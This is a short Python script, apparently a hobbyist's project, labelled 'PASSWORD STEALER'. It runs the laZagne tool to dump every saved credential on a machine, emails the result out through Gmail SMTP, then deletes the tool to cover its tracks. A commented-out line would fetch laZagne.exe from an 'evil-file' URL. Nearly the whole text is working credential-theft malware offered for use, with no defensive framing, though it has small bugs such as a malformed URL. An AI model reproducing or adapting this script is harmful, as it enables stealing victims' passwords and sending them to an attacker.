# Author: Muhammad Buhari
# GitHub: github.com/al-mohad
# Program: PASSWORD STEALER
# This file requires laZagne to work
import requests
import subprocess
import smtplib
import re
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    # create an instance of stmp server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# download("http:192.168.0.1/evil-file/laZagne.exe")
command = "laZagne.py --all"
result = subprocess.check_output(command, shell=True)
send_mail("your_email@gmail.com", "your_password", result)
os.remove("laZagne.py")
